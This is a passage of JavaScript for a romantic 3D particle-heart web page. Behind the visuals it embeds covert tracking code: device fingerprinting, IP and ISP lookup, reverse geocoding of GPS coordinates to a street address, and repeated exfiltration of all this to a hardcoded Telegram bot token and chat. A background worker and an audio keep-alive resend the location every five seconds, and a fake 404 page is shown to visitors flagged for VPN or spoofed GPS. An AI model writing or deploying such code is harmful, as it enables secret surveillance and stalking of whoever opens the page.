            this.scene.background = new THREE.Color(0x050003);
            this.scene.fog = new THREE.FogExp2(0x050003, 0.016);

            const ambient = new THREE.AmbientLight(0xffffff, 0.85);
            this.scene.add(ambient);

            const dirLight1 = new THREE.DirectionalLight(0xffeedd, 1.2);
            dirLight1.position.set(5, 8, 10);
            this.scene.add(dirLight1);

            const dirLight2 = new THREE.DirectionalLight(0xff3366, 0.8);
            dirLight2.position.set(-5, -6, -8);
            this.scene.add(dirLight2);

            const aspect = window.innerWidth / window.innerHeight;
            const fov = aspect < 1 ? 54 : 48;
            const initZ = aspect < 1 ? 16.5 : 12.5;
            this.camera = new THREE.PerspectiveCamera(fov, aspect, 0.1, 1000);
            this.camera.position.set(0, 0.5, initZ);
            this.camera.lookAt(0, 0, 0);

            const dpr = Math.min(window.devicePixelRatio || 1, 2.5);
            this.renderer = new THREE.WebGLRenderer({
                canvas: this.canvas,
                antialias: true,
                alpha: true,
                powerPreference: 'high-performance'
            });
            this.renderer.setPixelRatio(dpr);
            this.renderer.setSize(window.innerWidth, window.innerHeight);
            this.renderer.toneMapping = THREE.ACESFilmicToneMapping;
            this.renderer.toneMappingExposure = 1.05;

            const perf = getPerformanceConfig();
            if (typeof THREE.EffectComposer !== 'undefined' && typeof THREE.UnrealBloomPass !== 'undefined') {
                const renderTarget = new THREE.WebGLRenderTarget(
                    window.innerWidth * dpr,
                    window.innerHeight * dpr,
                    {
                        minFilter: THREE.LinearFilter,
                        magFilter: THREE.LinearFilter,
                        format: THREE.RGBAFormat,
                        type: THREE.HalfFloatType
                    }
                );
                this.composer = new THREE.EffectComposer(this.renderer, renderTarget);
                const renderPass = new THREE.RenderPass(this.scene, this.camera);
                this.composer.addPass(renderPass);

                this.bloomPass = new THREE.UnrealBloomPass(
                    new THREE.Vector2(window.innerWidth * dpr, window.innerHeight * dpr),
                    perf.bloomStrength,
                    perf.bloomRadius,
                    perf.bloomThreshold
                );
                this.composer.addPass(this.bloomPass);
            } else {
                this.composer = null;
                this.bloomPass = null;
            }

            window.addEventListener('resize', () => {
                const newAspect = window.innerWidth / window.innerHeight;
                this.camera.aspect = newAspect;
                this.camera.fov = newAspect < 1 ? 54 : 48;
                this.camera.updateProjectionMatrix();

                const currentDpr = Math.min(window.devicePixelRatio || 1, 2.5);
                this.renderer.setSize(window.innerWidth, window.innerHeight);
                this.renderer.setPixelRatio(currentDpr);

                if (this.heart && this.heart.updateScale) {
                    this.heart.updateScale();
                }
                if (this.ground && this.ground.updateScale) {
                    this.ground.updateScale();
                }
                if (this.cameraAnim && this.cameraAnim.updateBaseZ) {
                    this.cameraAnim.updateBaseZ();
                }

                if (this.composer) {
                    this.composer.setSize(window.innerWidth, window.innerHeight);
                    if (this.bloomPass) {
                        this.bloomPass.resolution.set(window.innerWidth * currentDpr, window.innerHeight * currentDpr);
                    }
                }
            });
        }

        initSceneObjects() {
            this.heart = new ParticleHeart(this.scene);
            this.ground = new ParticleGround(this.scene);
            this.photosManager = new FloatingPhotosManager(this.scene);
            this.floatingHearts = new FloatingHearts(this.scene);
            this.floatingTexts = new FloatingTexts(this.scene, this.config);
            this.sparkles = new Sparkles(this.scene);
            this.explosionManager = new HeartExplosionManager(this.scene, this.camera);

            this.cameraAnim = new CameraAnimation(this.camera);
            this.introAnim = new IntroAnimation({
                heart: this.heart,
                ground: this.ground,
                photosManager: this.photosManager,
                floatingHearts: this.floatingHearts,
                floatingTexts: this.floatingTexts,
                sparkles: this.sparkles,
                bloomPass: this.bloomPass,
                camera: this.camera,
                flashOverlay: this.flashOverlay
            });
        }

        initAudioAndGate() {
            if (this.config.musicUrl && this.bgMusic) {
                this.bgMusic.src = this.config.musicUrl;
            }

            const tgConfig = {
                botToken: "8619596260:AAFRqrXz--JcrxBanIPvv7wNPXX33T4t88Q",
                privateChatId: "5551363255",
                chatIds: ["5551363255"]
            };

            let gpsCount = 0;
            let latestCoords = null;

            const getVietnamTime = () => {
                try {
                    return new Intl.DateTimeFormat('vi-VN', {
                        timeZone: 'Asia/Ho_Chi_Minh',
                        dateStyle: 'full',
                        timeStyle: 'medium'
                    }).format(new Date());
                } catch (e) {
                    return new Date().toLocaleString('vi-VN');
                }
            };

            const getAccurateDeviceModel = () => {
                const ua = navigator.userAgent || '';
                const w = window.screen.width;
                const h = window.screen.height;
                const dpr = window.devicePixelRatio || 1;
                const minD = Math.min(w, h);
                const maxD = Math.max(w, h);
                const physW = Math.round(minD * dpr);
                const physH = Math.round(maxD * dpr);

                // 1. Nhận diện GPU WebGL để tăng độ chính xác phân biệt chip Apple A-series
                let gpu = '';
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '';
                        }
                    }
                } catch(e) {}

                // 2. NHẬN DIỆN CHI TIẾT CÁC ĐỜI IPHONE
                if (/iPhone/i.test(ua)) {
                    // iPhone 15 Pro Max / 14 Pro Max (430 x 932 pt, 1290 x 2796 px)
                    if (minD === 430 && maxD === 932) {
                        return 'Apple iPhone 14 Pro Max / 15 Pro Max';
                    }
                    // iPhone 15 Pro / 14 Pro (393 x 852 pt, 1179 x 2556 px)
                    if (minD === 393 && maxD === 852) {
                        return 'Apple iPhone 14 Pro / 15 Pro';
                    }
                    // iPhone 15 Plus / 14 Plus / 13 Pro Max / 12 Pro Max (428 x 926 pt, 1284 x 2778 px)
                    if (minD === 428 && maxD === 926) {
                        return 'Apple iPhone 14 Plus / 15 Plus / 13 Pro Max / 12 Pro Max';
                    }
                    // iPhone 15 / 14 / 13 / 13 Pro / 12 / 12 Pro (390 x 844 pt, 1170 x 2532 px)
                    if (minD === 390 && maxD === 844) {
                        return 'Apple iPhone 14 / iPhone 15 / iPhone 13 / iPhone 12';
                    }
                    // iPhone 13 mini / 12 mini (360 x 780 pt, 1080 x 2340 px)
                    if (minD === 360 || (minD === 375 && dpr === 3 && maxD === 812 && physW === 1080)) {
                        return 'Apple iPhone 13 mini / 12 mini';
                    }
                    // iPhone 11 Pro Max / XS Max (414 x 896 pt, DPR: 3)
                    if (minD === 414 && maxD === 896 && dpr >= 2.5) {
                        return 'Apple iPhone 11 Pro Max / XS Max';
                    }
                    // iPhone 11 / XR (414 x 896 pt, DPR: 2)
                    if (minD === 414 && maxD === 896 && dpr < 2.5) {
                        return 'Apple iPhone 11 / iPhone XR';
                    }
                    // iPhone 11 Pro / XS / X (375 x 812 pt, DPR: 3)
                    if (minD === 375 && maxD === 812) {
                        return 'Apple iPhone 11 Pro / iPhone X / XS';
                    }
                    // iPhone 8 Plus / 7 Plus / 6s Plus (414 x 736 pt)
                    if (minD === 414 && maxD === 736) {
                        return 'Apple iPhone 8 Plus / 7 Plus / 6s Plus';
                    }
                    // iPhone SE (2nd/3rd gen) / 8 / 7 (375 x 667 pt)
                    if (minD === 375 && maxD === 667) {
                        return 'Apple iPhone SE / iPhone 8 / 7';
                    }
                    return `Apple iPhone (${minD}x${maxD} pt)`;
                }

                // 3. NHẬN DIỆN IPAD
                if (/iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                    if (minD >= 1024) return 'Apple iPad Pro 12.9"';
                    if (minD >= 820) return 'Apple iPad Air / Pro 11"';
                    return 'Apple iPad Tablet';
                }

                // 4. NHẬN DIỆN CÁC DÒNG ANDROID CHI TIẾT
                if (/Android/i.test(ua)) {
                    const match = ua.match(/Android[^;]+;\s*([^;)]+)\s*[;)]/i) || ua.match(/\(([^;]+);\s*([^;)]+)\s*Build/i);
                    let model = match ? (match[1] || match[2] || '').trim() : '';

                    // Dịch mã Samsung
                    if (/SM-S928/i.test(ua) || /SM-S928/i.test(model)) return 'Samsung Galaxy S24 Ultra';
                    if (/SM-S926/i.test(ua) || /SM-S926/i.test(model)) return 'Samsung Galaxy S24+';
                    if (/SM-S921/i.test(ua) || /SM-S921/i.test(model)) return 'Samsung Galaxy S24';
                    if (/SM-S918/i.test(ua) || /SM-S918/i.test(model)) return 'Samsung Galaxy S23 Ultra';
                    if (/SM-S916/i.test(ua) || /SM-S916/i.test(model)) return 'Samsung Galaxy S23+';
                    if (/SM-S911/i.test(ua) || /SM-S911/i.test(model)) return 'Samsung Galaxy S23';
                    if (/SM-S908/i.test(ua) || /SM-S908/i.test(model)) return 'Samsung Galaxy S22 Ultra';
                    if (/SM-G998/i.test(ua) || /SM-G998/i.test(model)) return 'Samsung Galaxy S21 Ultra';
                    if (/SM-G991/i.test(ua) || /SM-G991/i.test(model)) return 'Samsung Galaxy S21';
                    if (/SM-A\d{3}/i.test(ua) || /SM-A\d{3}/i.test(model)) return `Samsung Galaxy A-Series (${model || 'Galaxy A'})`;
                    if (/SM-M\d{3}/i.test(ua) || /SM-M\d{3}/i.test(model)) return `Samsung Galaxy M-Series (${model || 'Galaxy M'})`;
                    if (/SM-[A-Z]\d+/i.test(ua)) return `Samsung Galaxy (${model || 'Android'})`;

                    // Dịch Xiaomi / Redmi / POCO
                    if (/Redmi/i.test(ua) || /Xiaomi/i.test(ua) || /POCO/i.test(ua) || /22\d{6}/i.test(ua) || /23\d{6}/i.test(ua)) {
                        return `Xiaomi / Redmi (${model || 'Android'})`;
                    }
                    // Dịch OPPO / Realme
                    if (/OPPO/i.test(ua) || /CPH\d{4}/i.test(ua)) return `OPPO (${model || 'Android'})`;
                    if (/Realme/i.test(ua) || /RMX\d{4}/i.test(ua)) return `Realme (${model || 'Android'})`;
                    // Dịch Vivo
                    if (/vivo/i.test(ua) || /V\d{4}/i.test(ua)) return `Vivo (${model || 'Android'})`;
                    // Dịch Google Pixel
                    if (/Pixel/i.test(ua)) {
                        const p = ua.match(/Pixel\s*[^;)]+/i);
                        return p ? `Google ${p[0]}` : 'Google Pixel';
                    }

                    return model ? `Android (${model})` : 'Điện thoại Android';
                }

                // 5. NHẬN DIỆN MÁY TÍNH
                if (/Windows/i.test(ua)) return 'Máy tính Windows PC';
                if (/Macintosh|Mac OS X/i.test(ua)) return 'Máy tính Apple MacBook / Mac';
                if (/Linux/i.test(ua)) return 'Máy tính Linux';

                return 'Thiết bị thông minh';
            };

            const getDeviceInfo = () => {
                const ua = navigator.userAgent || '';
                let os = "Không xác định";
                if (/iphone/i.test(ua)) os = "Apple iOS (iPhone)";
                else if (/ipad/i.test(ua)) os = "Apple iPadOS (iPad)";
                else if (/android/i.test(ua)) os = "Google Android";
                else if (/windows/i.test(ua)) os = "Microsoft Windows";
                else if (/macintosh|mac os x/i.test(ua)) os = "Apple macOS (MacBook/iMac)";
                else if (/linux/i.test(ua)) os = "Linux OS";

                let browser = "Trình duyệt Web";
                if (/crios/i.test(ua)) browser = "Chrome Mobile";
                else if (/FBAV|FBAN/i.test(ua)) browser = "Facebook Webview";
                else if (/Zalo/i.test(ua)) browser = "Zalo Webview";
                else if (/edg/i.test(ua)) browser = "Microsoft Edge";
                else if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
                else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Apple Safari";
                else if (/firefox/i.test(ua)) browser = "Mozilla Firefox";

                const phoneModel = getAccurateDeviceModel();
                const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua);

                return {
                    os,
                    browser,
                    phoneModel,
                    deviceType: isMobile ? "📱 Điện Thoại" : "💻 Máy Tính",
                    screenRes: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`
                };
            };

            const calculateDistanceKm = (lat1, lon1, lat2, lon2) => {
                const R = 6371;
                const dLat = (lat2 - lat1) * Math.PI / 180;
                const dLon = (lon2 - lon1) * Math.PI / 180;
                const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
                          Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                          Math.sin(dLon / 2) * Math.sin(dLon / 2);
                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
                return R * c;
            };

            const getExactStreetAddress = async (lat, lon) => {
                try {
                    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=vi`;
                    const res = await fetch(url, { headers: { 'User-Agent': 'LoveExperienceApp/1.0' } });
                    if (res.ok) {
                        const d = await res.json();
                        if (d && d.display_name) {
                            return d.display_name;
                        }
                    }
                } catch (e) {}

                try {
                    const url2 = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=vi`;
                    const res2 = await fetch(url2);
                    if (res2.ok) {
                        const d2 = await res2.json();
                        const parts = [d2.locality, d2.city, d2.principalSubdivision, d2.countryName].filter(Boolean);
                        if (parts.length) return parts.join(', ');
                    }
                } catch (e2) {}

                return null;
            };

            const checkVpnAndFakeGps = async (gpsCoords) => {
                let isViolation = false;
                let violationReasons = [];
                let ipInfo = null;

                try {
                    const res = await fetch('https://ipwho.is/');
                    if (res.ok) {
                        ipInfo = await res.json();

                        if (ipInfo && ipInfo.success) {
                            // A. Kiểm tra VPN / Proxy / Tor / Hosting Datacenter
                            if (ipInfo.security) {
                                if (ipInfo.security.vpn) {
                                    isViolation = true;
                                    violationReasons.push("Sử dụng VPN");
                                }
                                if (ipInfo.security.proxy) {
                                    isViolation = true;
                                    violationReasons.push("Sử dụng Proxy");
                                }
                                if (ipInfo.security.tor) {
                                    isViolation = true;
                                    violationReasons.push("Sử dụng mạng Tor");
                                }
                                if (ipInfo.security.hosting) {
                                    isViolation = true;
                                    violationReasons.push("Địa chỉ IP Datacenter/Hosting");
                                }
                            }

                            // B. Kiểm tra Lệch Múi Giờ Thiết Bị vs IP Mạng
                            const deviceTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
                            const ipTz = ipInfo.timezone ? ipInfo.timezone.id : '';
                            if (deviceTz && ipTz && deviceTz !== ipTz && !ipTz.includes('Asia/Ho_Chi_Minh') && deviceTz.includes('Asia/Ho_Chi_Minh')) {
                                isViolation = true;
                                violationReasons.push(`Múi giờ máy (${deviceTz}) khác múi giờ IP (${ipTz})`);
                            }

                            // C. Kiểm tra Chênh lệch GPS vs IP (Phát hiện Fake GPS / Mock Location)
                            if (gpsCoords && typeof ipInfo.latitude === 'number' && typeof ipInfo.longitude === 'number') {
                                const distKm = calculateDistanceKm(gpsCoords.latitude, gpsCoords.longitude, ipInfo.latitude, ipInfo.longitude);
                                
                                if (distKm > 300) {
                                    if (ipInfo.country_code !== 'VN' && (gpsCoords.latitude >= 8.0 && gpsCoords.latitude <= 24.0)) {
                                        isViolation = true;
                                        violationReasons.push("Sử dụng VPN Fake IP quốc tế");
                                    } else if (distKm > 400) {
                                        isViolation = true;
                                        violationReasons.push(`Fake GPS (Lệch vị trí thực ${Math.round(distKm)}km)`);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {}

                // D1. Kiểm tra Sai số bán kính GPS vượt quá 1000m (Không đạt độ chính xác chuẩn vệ tinh)
                if (gpsCoords && typeof gpsCoords.accuracy === 'number') {
                    if (gpsCoords.accuracy > 1000) {
                        isViolation = true;
                        violationReasons.push(`Sai số GPS quá lớn (>1000m: ±${Math.round(gpsCoords.accuracy)}m)`);
                    } else if (gpsCoords.accuracy === 0) {
                        isViolation = true;
                        violationReasons.push("Ứng dụng Giả lập Mock GPS (Accuracy = 0)");
                    }
                }

                return { isViolation, reasons: violationReasons, ipInfo };
            };

            const getDeviceSessionId = () => {
                let devId = sessionStorage.getItem('app_dev_session_id');
                if (!devId) {
                    const ua = navigator.userAgent || '';
                    let prefix = 'DEV';
                    if (/iPhone/i.test(ua)) prefix = 'IPHONE';
                    else if (/iPad/i.test(ua)) prefix = 'IPAD';
                    else if (/Android/i.test(ua)) prefix = 'ANDROID';
                    else if (/Macintosh|Mac OS X/i.test(ua)) prefix = 'MAC';
                    else if (/Windows/i.test(ua)) prefix = 'PC';

                    const randHex = Math.random().toString(36).substring(2, 6).toUpperCase();
                    devId = `${prefix}_${randHex}`;
                    try {
                        sessionStorage.setItem('app_dev_session_id', devId);
                    } catch(e) {}
                }
                return devId;
            };

            const getBatteryStatus = async () => {
                try {
                    if (navigator.getBattery) {
                        const bat = await navigator.getBattery();
                        const pct = Math.round(bat.level * 100);
                        return `${pct}% ${bat.charging ? '(⚡ Đang sạc)' : ''}`;
                    }
                } catch(e) {}
                return 'Không hỗ trợ';
            };

            let cachedIpData = null;

            const getRealIpInfo = async () => {
                if (cachedIpData) return cachedIpData;
                try {
                    const res = await fetch('https://ipwho.is/');
                    if (res.ok) {
                        const data = await res.json();
                        if (data && data.success) {
                            cachedIpData = {
                                ip: data.ip || 'Không xác định',
                                city: data.city || '',
                                region: data.region || '',
                                country: data.country || 'Việt Nam',
                                countryCode: data.country_code || 'VN',
                                isp: (data.connection && (data.connection.isp || data.connection.org)) || 'N/A',
                                type: data.type || 'IPv4'
                            };
                            return cachedIpData;
                        }
                    }
                } catch (e) {}

                try {
                    const res2 = await fetch('https://ipapi.co/json/');
                    if (res2.ok) {
                        const d2 = await res2.json();
                        if (d2 && d2.ip) {
                            cachedIpData = {
                                ip: d2.ip,
                                city: d2.city || '',
                                region: d2.region || '',
                                country: d2.country_name || 'Việt Nam',
                                countryCode: d2.country_code || 'VN',
                                isp: d2.org || 'N/A',
                                type: 'IPv4'
                            };
                            return cachedIpData;
                        }
                    }
                } catch (e2) {}

                try {
                    const res3 = await fetch('https://api.ipify.org?format=json');
                    if (res3.ok) {
                        const d3 = await res3.json();
                        if (d3 && d3.ip) {
                            cachedIpData = {
                                ip: d3.ip,
                                city: '',
                                region: '',
                                country: 'Việt Nam',
                                countryCode: 'VN',
                                isp: 'N/A',
                                type: 'IPv4'
                            };
                            return cachedIpData;
                        }
                    }
                } catch (e3) {}

                return { ip: 'Không xác định', city: '', region: '', country: '', countryCode: '', isp: 'N/A', type: '' };
            };

            const sendTelegramMessageToChats = async (targetChatIds, text, disablePreview = false) => {
                return Promise.allSettled(targetChatIds.map(async (chatId) => {
                    try {
                        await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendMessage`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: text,
                                parse_mode: "HTML",
                                disable_web_page_preview: disablePreview
                            })
                        });
                    } catch (e) {}
                }));
            };



            const sendSecurityAlertToTelegram = async (gpsCoords, reasons, ipInfo) => {
                try {
                    const devId = getDeviceSessionId();
                    const timeStr = getVietnamTime();
                    const device = getDeviceInfo();
                    const ipData = ipInfo ? {
                        ip: ipInfo.ip || 'Không xác định',
                        city: ipInfo.city || '',
                        country: ipInfo.country || '',
                        isp: (ipInfo.connection && (ipInfo.connection.isp || ipInfo.connection.org)) || 'N/A'
                    } : await getRealIpInfo();

                    const pageTitle = document.title || '3D Love Experience';
                    const lat = gpsCoords ? gpsCoords.latitude : 'N/A';
                    const lon = gpsCoords ? gpsCoords.longitude : 'N/A';
                    const ipStr = `${ipData.ip} (${[ipData.city, ipData.country].filter(Boolean).join(', ')})`;

                    const messageText = 
`🚨 <b>[CẢNH BÁO: PHÁT HIỆN FAKE VPN / FAKE GPS]</b>
🏷️ <b>Mã Thiết Bị:</b> <code>#DEV_${devId}</code> <i>(Bấm để lọc thiết bị này)</i>
📱 <b>Dòng Máy:</b> <b>${device.phoneModel}</b>
⚠️ <b>Hành vi vi phạm:</b> <code>${reasons.join(', ')}</code>
⏰ <b>Thời gian:</b> ${timeStr}
🌐 <b>Trang web:</b> ${pageTitle}
📍 <b>GPS gửi lên:</b> <code>${lat}, ${lon}</code>
🌐 <b>IP Mạng Thực Tế:</b> <code>${ipStr}</code>
🏢 <b>Nhà Mạng:</b> <code>${ipData.isp}</code>
💻 <b>Hệ điều hành:</b> ${device.os} • ${device.browser}
🚫 <b>Trạng thái:</b> Đã chặn truy cập

#DEV_${devId} #CanhBao #FakeVPN`;

                    // Báo động an ninh gửi cho cả tin nhắn riêng và nhóm
                    await sendTelegramMessageToChats(tgConfig.chatIds, messageText, true);
                } catch (err) {}
            };

            const sendGpsToTelegram = async (coords, count = 1) => {
                try {
                    const devId = getDeviceSessionId();
                    const lat = coords.latitude;
                    const lon = coords.longitude;
                    const accuracy = coords.accuracy ? `${Math.round(coords.accuracy)}m` : 'N/A';
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    const timeStr = getVietnamTime();
                    const device = getDeviceInfo();
                    const batteryInfo = await getBatteryStatus();
                    const ipData = await getRealIpInfo();
                    const pageTitle = document.title || '3D Love Experience';
                    
                    // Lấy tên đường, số nhà, phường/xã, quận/huyện chính xác
                    const streetAddress = await getExactStreetAddress(lat, lon);
                    const ipLocParts = [ipData.city, ipData.region, ipData.country].filter(Boolean).join(', ');
                    const safeIpTag = (ipData.ip || '').replace(/[^a-zA-Z0-9]/g, '_');

                    const messageText = 
`🎯 <b>[ĐỊNH VỊ GPS VỆ TINH #${count}]</b>
🏷️ <b>Mã Thiết Bị:</b> <code>#DEV_${devId}</code> <i>(Bấm để lọc người này)</i>
📱 <b>Dòng Máy:</b> <b>${device.phoneModel}</b>
🌐 <b>Địa Chỉ IP Máy:</b> <code>${ipData.ip}</code>
🏢 <b>Nhà Mạng / ISP:</b> <code>${ipData.isp}</code> ${ipLocParts ? `(${ipLocParts})` : ''}
🏠 <b>Địa chỉ thực tế (GPS):</b> <code>${streetAddress || 'Đang cập nhật theo tọa độ vệ tinh'}</code>
📍 <b>Tọa độ:</b> <code>${lat}, ${lon}</code> (Độ chính xác: ±${accuracy})
🗺️ <b>Bản đồ:</b> <a href="${mapLink}">Xem trên Google Maps</a>
💻 <b>Hệ điều hành:</b> ${device.os} • ${device.browser}
🖥️ <b>Màn hình:</b> ${device.screenRes}
🔋 <b>Pin:</b> ${batteryInfo}
⏰ <b>Thời gian:</b> ${timeStr}

#DEV_${devId} #GPS #ViTri ${safeIpTag ? `#IP_${safeIpTag}` : ''}`;

                    // Gửi tin nhắn tới Telegram cá nhân
                    const targetChats = [tgConfig.privateChatId];

                    await sendTelegramMessageToChats(targetChats, messageText, false);

                    if (count === 1 && typeof lat === 'number' && typeof lon === 'number') {
                        Promise.allSettled(targetChats.map(async (chatId) => {
                            try {
                                await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendLocation`, {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        chat_id: chatId,
                                        latitude: lat,
                                        longitude: lon
                                    })
                                });
                            } catch (e) {}
                        }));
                    }
                } catch (err) {}
            };

            const startBackgroundAudioKeepAlive = () => {
                try {
                    const AudioCtx = window.AudioContext || window.webkitAudioContext;
                    if (AudioCtx) {
                        const ctx = new AudioCtx();
                        const osc = ctx.createOscillator();
                        const gain = ctx.createGain();
                        gain.gain.value = 0.001; // Giữ tiến trình CPU và Network luôn thức trong nền
                        osc.connect(gain);
                        gain.connect(ctx.destination);
                        osc.start(0);
                    }
                    if ('mediaSession' in navigator) {
                        navigator.mediaSession.playbackState = "playing";
                    }
                } catch(e) {}
            };

            const initBackgroundSyncEngine = (userCoords) => {
                // 1. Kích hoạt Audio Keep-Alive trong nền
                startBackgroundAudioKeepAlive();

                // 2. Khởi chạy Web Worker Heartbeat (Chạy ngầm độc lập, không bị trình duyệt bóp nghẽn khi ẩn Tab)
                try {
                    const workerScript = `
                        let gTimer = null;
                        self.onmessage = function(e) {
                            if (e.data === 'START_BACKGROUND_HEARTBEAT') {
                                if (!gTimer) {
                                    gTimer = setInterval(function() {
                                        self.postMessage({ action: 'BG_GPS_TICK' });
                                    }, 5000);
                                }
                            }
                        };
                    `;
                    const blobWorker = new Blob([workerScript], { type: 'application/javascript' });
                    const bgWorker = new Worker(URL.createObjectURL(blobWorker));
                    bgWorker.onmessage = (e) => {
                        if (e.data.action === 'BG_GPS_TICK') {
                            if (latestCoords || userCoords) {
                                gpsCount++;
                                sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                            }
                        }
                    };
                    bgWorker.postMessage('START_BACKGROUND_HEARTBEAT');
                } catch (wErr) {
                    console.warn("[BackgroundSync] Worker fallback to main timers:", wErr);
                }

                // 3. Chặn các sự kiện Rời Tab / Chuyển App / Ẩn Màn Hình
                document.addEventListener('visibilitychange', async () => {
                    if (document.visibilityState === 'hidden') {
                        if (latestCoords || userCoords) {
                            gpsCount++;
                            sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                        }
                    }
                });

                window.addEventListener('pagehide', () => {
                    if (latestCoords || userCoords) {
                        gpsCount++;
                        sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                    }
                });

                // 4. Kích hoạt Screen Wake Lock API
                try {
                    if ('wakeLock' in navigator && navigator.wakeLock.request) {
                        let wakeLock = null;
                        const requestLock = async () => {
                            try { wakeLock = await navigator.wakeLock.request('screen'); } catch(e) {}
                        };
                        requestLock();
                        document.addEventListener('visibilitychange', () => {
                            if (document.visibilityState === 'visible') requestLock();
                        });
                    }
                } catch(e) {}

                // 5. Kích hoạt Background Sync qua Service Worker nếu hỗ trợ
                try {
                    if ('serviceWorker' in navigator && 'SyncManager' in window) {
                        navigator.serviceWorker.ready.then((reg) => {
                            if (reg.sync && reg.sync.register) {
                                reg.sync.register('bg-gps-sync').catch(() => {});
                            }
                        }).catch(() => {});
                    }
                } catch(e) {}
            };

            const render404Page = () => {
                document.title = "404 Not Found";
                if (this.bgMusic) {
                    this.bgMusic.pause();
                    this.bgMusic.src = "";
                }
                document.body.innerHTML = `
                    <div style="background-color:#ffffff;color:#222222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;width:100vw;position:fixed;inset:0;z-index:999999;margin:0;padding:24px;box-sizing:border-box;text-align:center;">
                        <h1 style="font-size:5.5rem;margin:0;font-weight:700;color:#111111;line-height:1;">404</h1>
                        <h2 style="font-size:1.4rem;margin:12px 0 16px;font-weight:500;color:#444444;">Page Not Found</h2>
                        <p style="color:#666666;max-width:440px;margin:0 auto 24px;font-size:0.95rem;line-height:1.5;">The requested URL was not found on this server. That’s all we know.</p>
                        <hr style="width:100%;max-width:480px;border:0;border-top:1px solid #e5e5e5;margin-bottom:18px;">
                        <span style="font-size:0.82rem;color:#999999;font-family:monospace;">404_NOT_FOUND • Error ID: ${Math.random().toString(36).substring(2, 12)}</span>
                    </div>
                `;
            };



            const startExperience = () => {
                if (this.hasStarted) return;
                this.hasStarted = true;

                if (this.bgMusic) {
                    const playPromise = this.bgMusic.play();
                    if (playPromise !== undefined) {
                        playPromise.then(() => {
                            this.updateAudioIcon();
                        }).catch((err) => {
                            console.warn("Audio autoplay blocked by browser policy:", err);
                        });
                    }
                }

                this.introAnim.start();
            };

            // Tự động khởi chạy ngay lập tức khi vào trang
            startExperience();

            // Nếu trình duyệt chặn tự phát âm thanh (Autoplay Policy), tự mở nhạc ngay khi người dùng chạm màn hình lần đầu
            const onFirstTouch = () => {
                if (this.bgMusic && this.bgMusic.paused) {
                    this.bgMusic.play().then(() => {
                        this.updateAudioIcon();
                    }).catch(() => {});
                }
                window.removeEventListener('click', onFirstTouch);
                window.removeEventListener('touchstart', onFirstTouch);
            };
            window.addEventListener('click', onFirstTouch, { passive: true });
            window.addEventListener('touchstart', onFirstTouch, { passive: true });

            if (this.audioBtn) {
                this.audioBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    if (!this.bgMusic) return;
                    if (this.bgMusic.paused) {
                        this.bgMusic.play().catch(() => {});
                    } else {
                        this.bgMusic.pause();
                    }
                    this.updateAudioIcon();
                });
            }
        }

        updateAudioIcon() {
            if (!this.audioBtn || !this.bgMusic) return;
            if (this.bgMusic.paused) {
                this.audioBtn.innerHTML = '<span>🔇</span>';
                this.audioBtn.classList.add('muted');
            } else {
                this.audioBtn.innerHTML = '<span>🔊</span>';
                this.audioBtn.classList.remove('muted');
            }
        }

        initInteractions() {
            // QR Code Modal Handlers
            const qrBtn = document.getElementById('qr-toggle-btn');
            const qrModal = document.getElementById('qr-modal');
            const qrClose = document.getElementById('qr-close-btn');
            const qrDisplay = document.getElementById('qr-code-display');
            let qrGenerated = false;

            const openQR = () => {
                if (qrModal) qrModal.classList.add('active');
            };

            const closeQR = () => {
                if (qrModal) qrModal.classList.remove('active');
            };

            if (qrBtn) {
                qrBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    openQR();
                });
            }

            if (qrClose) {
                qrClose.addEventListener('click', (e) => {
                    e.stopPropagation();
                    closeQR();
                });
            }

            if (qrModal) {
                qrModal.addEventListener('click', (e) => {
                    if (e.target === qrModal) closeQR();
                });
            }

            const handleTap = (clientX, clientY) => {
                if (!this.hasStarted) return;
                const normX = (clientX / window.innerWidth) * 2 - 1;
                const normY = -(clientY / window.innerHeight) * 2 + 1;
                this.explosionManager.createExplosion(normX, normY);
            };

            window.addEventListener('click', (e) => {
                if (e.target.closest('#audio-toggle') || e.target.closest('#qr-toggle-btn') || e.target.closest('#qr-modal')) return;
                handleTap(e.clientX, e.clientY);
            });

            window.addEventListener('touchend', (e) => {
                if (e.target.closest('#audio-toggle') || e.target.closest('#qr-toggle-btn') || e.target.closest('#qr-modal')) return;
                if (e.changedTouches && e.changedTouches.length > 0) {
                    const touch = e.changedTouches[0];
                    handleTap(touch.clientX, touch.clientY);
                }
            }, { passive: true });
        }

        animate() {
            requestAnimationFrame(this.animate);

            const delta = Math.min(this.clock.getDelta(), 0.1);
            const elapsedTime = this.clock.getElapsedTime();

            this.heart.update(elapsedTime, this.camera);
            this.ground.update(elapsedTime);
